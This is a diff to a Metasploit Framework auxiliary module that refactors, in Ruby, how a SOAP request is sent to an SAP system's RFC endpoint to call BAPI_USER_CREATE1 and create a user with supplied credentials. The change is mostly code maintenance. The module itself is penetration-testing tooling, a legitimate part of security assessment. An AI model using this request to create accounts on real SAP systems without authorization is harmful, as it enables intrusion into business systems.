@@ -2,7 +2,7 @@
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+#   http://metasploit.com/framework/
 ##
 
 ##
@@ -70,21 +70,20 @@ class Metasploit4 < Msf::Auxiliary
 		data << '</n1:BAPI_USER_CREATE1>'
 		data << '</env:Body>'
 		data << '</env:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
 		begin
 			print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'")
-			res = send_request_raw({
+			res = send_request_cgi({
 				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
 				'method' => 'POST',
 				'data' => data,
-				'headers' =>{
-					'Content-Length' => data.size.to_s,
-					'SOAPAction'     => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization'  => 'Basic ' + user_pass,
-					'Content-Type'   => 'text/xml; charset=UTF-8'
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'headers' =>
+					{
+						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
 					}
-				}, 45)
+			})
 			if res and res.code == 200
 				if res.body =~ /<h1>Logon failed<\/h1>/
 					print_error("[SAP] #{ip}:#{rport} - Logon failed")
